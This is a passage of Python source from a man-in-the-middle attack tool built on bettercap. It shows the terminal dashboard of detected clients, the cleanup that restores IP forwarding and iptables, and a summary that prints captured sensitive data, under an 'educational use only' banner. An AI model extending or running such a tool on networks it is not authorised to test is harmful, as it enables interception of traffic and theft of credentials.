                            clients_table.add_column("MAC", style="green", no_wrap=True)
                            clients_table.add_column("Hostname", style="blue")
                            
                            if attack_stats['clients']:
                                # Show most recent clients first
                                sorted_clients = sorted(
                                    attack_stats['clients'].items(), 
                                    key=lambda x: x[1]['first_seen'], 
                                    reverse=True
                                )
                                
                                for ip, data in sorted_clients[:15]:  # Show up to 15 clients (öncekinden daha fazla)
                                    clients_table.add_row(
                                        ip, 
                                        data['mac'], 
                                        data['hostname'] if 'hostname' in data else "Unknown"
                                    )
                            else:
                                clients_table.add_row("", "[yellow]No clients detected yet[/]", "")
                                
                            clients_panel = Panel(
                                clients_table,
                                title=f"[bold cyan]Detected Clients[/]",
                                border_style="cyan"
                            )
                            layout["clients"].update(clients_panel)
                            
                            # 7. Update Footer
                            footer = Panel(
                                "[bold white on red]⚠️ EDUCATIONAL USE ONLY - Press Ctrl+C to stop attack - Unauthorized use is ILLEGAL ⚠️[/]",
                                border_style="red"
                            )
                            layout["footer"].update(footer)
                            
                            # Small delay to prevent high CPU usage
                            time.sleep(0.5)
                            
                    except KeyboardInterrupt:
                        # User stopped the attack
                        self.console.print("\n[bold yellow]MITM attack stopped by user.[/]")
                    finally:
                        # Close log files
                        if 'bettercap_stdout_file' in locals() and not bettercap_stdout_file.closed:
                            bettercap_stdout_file.close()
                        if 'bettercap_stderr_file' in locals() and not bettercap_stderr_file.closed:
                            bettercap_stderr_file.close()
                        
                        # Restore system settings
                        self._restore_settings(original_ip_forward, original_iptables, bettercap_process)
                        
                        # Show summary
                        self.console.print(f"\n[bold green]Attack completed. All logs saved to {log_dir}[/]")
                        
                        # Display sensitive data summary
                        if attack_stats['sensitive_matches']:
                            self.console.print("\n[bold red]Sensitive Data Summary:[/]")
                            for data in attack_stats['sensitive_matches'][-5:]:  # Show last 5 entries
                                self.console.print(f"[red]{data}[/]")
                        
                        # Display traffic summary
                        self.console.print(f"\n[bold green]Traffic Summary:[/]")
                        self.console.print(f"Total Packets: {attack_stats['packets']:,}")
                        self.console.print(f"Total Data: {self._format_bytes(attack_stats['bytes'])}")
                        self.console.print(f"Unique Clients: {len(attack_stats['clients']):,}")
                        
            except Exception as e:
                # Handle unexpected errors
                self.console.print(f"\n[bold red]Error during MITM attack: {str(e)}[/]")
                import traceback
                traceback.print_exc()
                
                # Always try to restore settings
                if 'original_ip_forward' in locals() and 'original_iptables' in locals():
                    self._restore_settings(original_ip_forward, original_iptables, 
                                         bettercap_process if 'bettercap_process' in locals() else None)

